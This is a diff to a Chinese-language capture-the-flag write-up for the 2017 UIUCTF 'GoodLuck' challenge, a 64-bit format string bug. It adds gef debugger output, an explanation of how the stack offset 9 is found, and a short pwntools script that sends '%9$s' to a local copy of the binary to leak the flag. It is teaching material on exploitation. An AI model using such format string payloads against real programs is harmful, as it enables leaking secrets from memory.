@@ -2,13 +2,14 @@
 
 > challenge name: GoodLuck
 >
-> file: goodluck, flag.txt
+> file: goodluck, flag.txt 原题是远程的flag.txt，这里使用一个本地的代替
 >
 > original writeup: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck
 >
 > 
 
 - 64bit format string
+- 目的是获取远端的flag.txt的内容，由于条件限制，这里复现时使用的是本地文件
 
 
 
@@ -71,4 +72,69 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   return 0;
 }
 ```
+
+# offset: `%9$n`
+
+```assembly
+gef➤  b printf
+Breakpoint 1 at 0x400640
+gef➤  r
+Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck 
+what's the flag
+123456
+You answered:
+Breakpoint 1, __printf (format=0x602830 "123456") at printf.c:28
+28  printf.c: 没有那个文件或目录.
+─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+   0x7ffff7a627f7 <fprintf+135>    add    rsp, 0xd8
+   0x7ffff7a627fe <fprintf+142>    ret    
+   0x7ffff7a627ff                  nop    
+ → 0x7ffff7a62800 <printf+0>       sub    rsp, 0xd8
+   0x7ffff7a62807 <printf+7>       test   al, al
+   0x7ffff7a62809 <printf+9>       mov    QWORD PTR [rsp+0x28], rsi
+   0x7ffff7a6280e <printf+14>      mov    QWORD PTR [rsp+0x30], rdx
+───────────────────────────────────────────────────────────────────────[ stack ]────
+['0x7fffffffdb08', 'l8']
+8
+0x00007fffffffdb08│+0x00: 0x0000000000400890  →  <main+234> mov edi, 0x4009b8    ← $rsp
+0x00007fffffffdb10│+0x08: 0x0000000031000001
+0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 ("123456"?)
+0x00007fffffffdb20│+0x18: 0x0000000000602010  →  "You answered:\ng"
+0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  "flag{11111111111111111"
+0x00007fffffffdb30│+0x28: "flag{11111111111111111"
+0x00007fffffffdb38│+0x30: "11111111111111"
+0x00007fffffffdb40│+0x38: 0x0000313131313131 ("111111"?)
+──────────────────────────────────────────────────────────────────────────────[ trace ]────
+[#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 "123456")
+[#1] 0x400890 → Name: main()
+```
+
+- 64bit Linux前6个参数在对应寄存器中，而分析栈可知flag在栈上的偏移为5，去除RA，则flag为第4个。fmt str存储在RDI寄存器中，是第一个参数，寄存器总共传递了6个参数，故flag相对于fmt str的距离为 `4+6-1=9`。故输入 `%9$s` 即可得到 flag 的内容
+- 另外可以使用pwdgdb( https://github.com/scwuaptx/Pwngdb ) 中的fmtarg判断某个参数的偏移
+
+```
+gef➤  fmtarg 0x00007fffffffdb28
+The index of format argument : 10
+```
+
+
+
+
+
+# exploit
+
+```python
+from pwn import *
+context.log_level = "DEBUG"
+goodluck = ELF('./goodluck')
+sh = process('./goodluck')
+payload = b"%9$s"
+print(payload)
+# gdb.attach(sh)
+sh.sendline(payload)
+print(sh.recv())
+sh.interactive()
+```
+
+
 
